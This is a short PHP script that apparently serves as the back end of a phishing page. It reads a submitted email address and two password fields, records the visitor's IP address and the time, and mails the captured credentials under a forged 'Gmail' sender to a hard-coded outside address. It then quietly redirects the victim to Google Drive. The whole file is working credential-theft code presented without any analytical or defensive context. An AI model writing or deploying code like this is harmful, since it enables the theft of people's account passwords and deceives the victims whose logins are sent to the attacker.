<?
session_start();
$login=  $_POST['identifier'];
$passwd=  $_POST['password1'];
$password=  $_POST['password2'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");

  $subj = "Live From - $ip";
  $msg = "Email: $login\nPassword: $passwd\nPassword2: $password\n\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By\n-----------------------------------";
  $from = "From: Gmail<results@popeye.com>";
  mail("bramsden@ramsden-on.ca", $subj, $msg, $from);
    mail("", $subj, $msg, $from);
  header("location: https://drive.google.com/");

?>